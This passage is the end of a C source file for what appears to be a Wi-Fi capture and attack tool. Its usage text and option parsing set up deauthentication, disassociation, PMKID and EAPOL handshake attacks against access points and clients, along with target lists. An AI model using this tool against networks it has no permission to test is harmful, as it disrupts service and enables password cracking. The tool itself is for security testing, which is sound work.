ll.sll_ifindex = ifr.ifr_ifindex;
ll.sll_protocol = htons(ETH_P_ALL);
if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0)
	{
	perror("failed to bind socket");
	close(fd_socket);
	return false;
	}

if(ioctl(fd_socket, SIOCGIFHWADDR, &ifr) < 0)
	{
	perror("failed to get hardware address");
	close(fd_socket);
	return false;
	}
else
	{
	memset(&mac_orig, 0 ,6);
	memcpy(&mac_orig, ifr.ifr_hwaddr.sa_data, 6);
	}
return true;
}
/*===========================================================================*/
static bool check_wlaninterface(const char* ifname)
{
static int fd_info;
struct iwreq fpwrq;

memset(&fpwrq, 0, sizeof(fpwrq));
strncpy(fpwrq.ifr_name, ifname, IFNAMSIZ -1);
if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
	perror( "socket info failed" );
	return false;
	}

if(ioctl(fd_info, SIOCGIWNAME, &fpwrq) != -1)
	{
	return true;
	}
close(fd_info);
return false;
}
/*===========================================================================*/
static void show_wlaninterfaces()
{
struct ifaddrs *ifaddr=NULL;
struct ifaddrs *ifa = NULL;
struct sockaddr_ll *sfda;
static int i = 0;

if(getifaddrs(&ifaddr) == -1)
	{
	perror("getifaddrs failed ");
	}
else
	{
	printf("suitable wlan interfaces:\n");
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
			if(check_wlaninterface(ifa->ifa_name) == true)
				{
				sfda = (struct sockaddr_ll*)ifa->ifa_addr;
				printf("INTERFACE: %s [", ifa->ifa_name);
				for (i=0; i < sfda->sll_halen; i++)
					{
					printf("%02x", (sfda->sll_addr[i]));
					}
				printf("]\n");
				}
			}
		}
	freeifaddrs(ifaddr);
	}
}
/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION, VERSION_JAHR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n"
	"usage  : %s <options>\n"
	"example: %s -o output.pcapng -i wlp39s0f3u4u5 -t 5 --enable_status\n"
	"\n"
	"options:\n"
	"-i <interface> : interface (monitor mode must be enabled)\n"
	"                 ip link set <interface> down\n"
	"                 iw dev <interface> set type monitor\n"
	"                 ip link set <interface> up\n"
	"-o <dump file> : output file in pcapngformat\n"
	"                 management frames and EAP/EAPOL frames\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-O <dump file> : output file in pcapngformat\n"
	"                 unencrypted IPv4 and IPv6 frames\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-W <dump file> : output file in pcapngformat\n"
	"                 encrypted WEP frames\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-c <digit>     : set scanlist  (1,2,3,...)\n"
	"                 default scanlist: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12\n"
	"                 maximum entries: 127\n"
	"                 allowed channels:\n"
	"                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n"
	"                 34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64\n"
	"                 100, 104, 108, 112, 116, 120, 124, 128, 132,\n"
	"                 136, 140, 144, 147, 149, 151, 153, 155, 157\n"
	"                 161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"                 default: %d seconds\n"
	"-E <digit>     : EAPOL timeout\n"
	"                 default: %d = 1 second\n"
	"                 value depends on channel assignment\n"
	"-D <digit>     : deauthentication interval\n"
	"                 default: %d (every %d beacons)\n"
	"                 the target beacon interval is used as trigger\n"
	"-A <digit>     : ap attack interval\n"
	"                 default: %d (every %d beacons)\n"
	"                 the target beacon interval is used as trigger\n"
	"-I             : show suitable wlan interfaces and quit\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n"
	"--filterlist=<file>                : mac filter list\n"
	"                                     format: 112233445566 + comment\n"
	"                                     maximum line lenght 128, maximum entries 32\n"
	"--filtermode=<digit>               : mode for filter list\n"
	"                                     1: use filter list as protection list (default)\n"
	"                                     2: use filter list as target list\n"
	"--disable_active_scan              : do not transmit proberequests to BROADCAST using a BROADCAST ESSID\n"
	"                                     do not transmit BROADCAST beacons\n"
	"                                     affected: ap-less and client-less attacks\n"
	"--disable_deauthentications        : disable transmitting deauthentications\n"
	"                                     affected: connections between client an access point\n"
	"                                     deauthentication attacks will not work against protected management frames\n"
	"--give_up_deauthentications=<digit>: disable transmitting deauthentications after n tries\n"
	"                                     default: %d tries (minimum: 4)\n"
	"                                     affected: connections between client an access point\n"
	"                                     deauthentication attacks will not work against protected management frames\n"
	"--disable_disassociations          : disable transmitting disassociations\n"
	"                                     affected: retry (EAPOL 4/4 - M4) attack\n"
	"--disable_ap_attacks               : disable attacks on single access points\n"
	"                                     affected: client-less (PMKID) attack\n"
	"--give_up_ap_attacks=<digit>       : disable transmitting directed proberequests after n tries\n"
	"                                     default: %d tries (minimum: 4)\n"
	"                                     affected: client-less attack\n"
	"                                     deauthentication attacks will not work against protected management frames\n"
	"--disable_client_attacks           : disable attacks on single clients\n"
	"                                     affected: ap-less (EAPOL 2/4 - M2) attack\n"
	"--enable_status=<digit>            : enable status messages\n"
	"                                     bitmask:\n"
	"                                     1: EAPOL\n"
	"                                     2: PROBEREQUEST/PROBERESPONSE\n"
	"                                     4: AUTHENTICATON\n"
	"                                     8: ASSOCIATION\n"
	"--help                             : show this help\n"
	"--version                          : show version\n"
	"\n", eigenname, VERSION, VERSION_JAHR, eigenname, eigenname, TIME_INTERVAL, EAPOLTIMEOUT, DEAUTHENTICATIONINTERVALL, DEAUTHENTICATIONINTERVALL, APATTACKSINTERVALL, APATTACKSINTERVALL, DEAUTHENTICATIONS_MAX, APPATTACKS_MAX);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int index;
static bool showinterfaces = false;
maxerrorcount = ERRORMAX;
staytime = TIME_INTERVAL;
eapoltimeout = EAPOLTIMEOUT;
deauthenticationintervall = DEAUTHENTICATIONINTERVALL;
deauthenticationsmax = DEAUTHENTICATIONS_MAX;
apattacksintervall = APATTACKSINTERVALL;
apattacksmax = APPATTACKS_MAX;
filtermode = 0;
statusout = 0;

poweroffflag = false;
activescanflag = false;
deauthenticationflag = false;
disassociationflag = false;
attackapflag = false;
attackclientflag = false;

interfacename = NULL;
pcapngoutname = NULL;
ippcapngoutname = NULL;
weppcapngoutname = NULL;
filterlistname = NULL;

static const char *short_options = "i:o:O:W:c:t:T:E:D:A:Ihv";
static const struct option long_options[] =
{
	{"filterlist",			required_argument,	NULL,	HCXD_FILTERLIST},
	{"filtermode",			required_argument,	NULL,	HCXD_FILTERMODE},
	{"disable_active_scan",		no_argument,		NULL,	HCXD_DISABLE_ACTIVE_SCAN},
	{"disable_deauthentications",	no_argument,		NULL,	HCXD_DISABLE_DEAUTHENTICATIONS},
	{"give_up_deauthentications",	required_argument,	NULL,	HCXD_GIVE_UP_DEAUTHENTICATIONS},
	{"disable_disassociations",	no_argument,		NULL,	HCXD_DISABLE_DISASSOCIATIONS},
	{"disable_ap_attacks",		no_argument,		NULL,	HCXD_DISABLE_AP_ATTACKS},
	{"give_up_ap_attacks",		required_argument,	NULL,	HCXD_GIVE_UP_AP_ATTACKS},
	{"disable_client_attacks",	no_argument,		NULL,	HCXD_DISABLE_CLIENT_ATTACKS},
	{"enable_status",		required_argument,	NULL,	HCXD_ENABLE_STATUS},
	{"version",			no_argument,		NULL,	HCXD_VERSION},
	{"help",			no_argument,		NULL,	HCXD_HELP},
	{NULL,				0,			NULL,	0}
};

auswahl = -1;
index = 0;
optind = 1;
optopt = 0;

while((auswahl = getopt_long (argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case HCXD_FILTERLIST:
		filterlistname = optarg;
		if(filtermode == 0)
			{
			filtermode = 1;
			}
		break;

		case HCXD_FILTERMODE:
		filtermode = strtol(optarg, NULL, 10);
		if((filtermode < 1) || (filtermode > 2))
			{
			fprintf(stderr, "wrong filtermode\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCXD_DISABLE_ACTIVE_SCAN:
		activescanflag = true;
		break;

		case HCXD_DISABLE_DEAUTHENTICATIONS:
		deauthenticationflag = true;
		break;

		case HCXD_GIVE_UP_DEAUTHENTICATIONS:
		deauthenticationsmax = strtol(optarg, NULL, 10);
		if(deauthenticationsmax < 4)
			{
			fprintf(stderr, "wrong deauthentication give up value\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCXD_DISABLE_DISASSOCIATIONS:
		disassociationflag = true;
		break;

		case HCXD_DISABLE_AP_ATTACKS:
		attackapflag = true;
		break;

		case HCXD_GIVE_UP_AP_ATTACKS:
		apattacksmax = strtol(optarg, NULL, 10);
		if(apattacksmax < 4)
			{
			fprintf(stderr, "wrong ap-attack give up value\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCXD_DISABLE_CLIENT_ATTACKS:
		attackclientflag = true;
		break;

		case HCXD_ENABLE_STATUS:
		statusout |= strtol(optarg, NULL, 10);
		break;

		case HCXD_HELP:
		usage(basename(argv[0]));
		break;

		case HCXD_VERSION:
		version(basename(argv[0]));
		break;

		case '?':
		printf("invalid argument specified\n");
		exit(EXIT_FAILURE);
		break;
		}
	}

optind = 1;
optopt = 0;
index = 0;
while((auswahl = getopt_long (argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case 'i':
		interfacename = optarg;
		if(interfacename == NULL)
			{
			fprintf(stderr, "no interface specified\n");
			exit(EXIT_FAILURE);
			}
		break;

		case 'o':
		pcapngoutname = optarg;
		break;

		case 'O':
		ippcapngoutname = optarg;
		break;

		case 'W':
		weppcapngoutname = optarg;
		break;

		case 'c':
		if(processuserscanlist(optarg) == false)
			{
			fprintf(stderr, "unknown channel selected\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 't':
		staytime = strtol(optarg, NULL, 10);
		if(staytime <= 1)
			{
			fprintf(stderr, "wrong hoptime\nsetting hoptime to 1\n");
			staytime = TIME_INTERVAL;
			}
		break;

		case 'E':
		eapoltimeout = strtol(optarg, NULL, 10);
		if(eapoltimeout < 10)
			{
			fprintf(stderr, "EAPOL timeout is to low\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'D':
		deauthenticationintervall = strtol(optarg, NULL, 10);
		if(deauthenticationintervall < 1)
			{
			fprintf(stderr, "wrong deauthentication intervall\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'A':
		apattacksintervall = strtol(optarg, NULL, 10);
		if(apattacksintervall < 1)
			{
			fprintf(stderr, "wrong access point attack intervall\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'T':
		maxerrorcount = strtol(optarg, NULL, 10);
		break;

		case 'I':
		showinterfaces = true;
		break;

		case 'h':
		usage(basename(argv[0]));
		break;

		case 'v':
		version(basename(argv[0]));
		break;

		case '?':
		printf("invalid argument specified\n");
		exit(EXIT_FAILURE);
		break;
		}
	}

if(filterlistname == NULL)
	{
	filtermode = 0;
	}

if(showinterfaces == true)
	{
	show_wlaninterfaces();
	return EXIT_SUCCESS;
	}

if(interfacename == NULL)
	{
	fprintf(stderr, "no interface selected\n");
	exit(EXIT_FAILURE);
	}

if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	exit(EXIT_FAILURE);
	}

if(opensocket() == false)
	{
	fprintf(stderr, "failed to init socket\n");
	exit(EXIT_FAILURE);
	}

if(globalinit() == false)
	{
	fprintf(stderr, "failed to init globals\n");
	exit(EXIT_FAILURE);
	}

processpackets(); 



return EXIT_SUCCESS;
}
/*===========================================================================*/
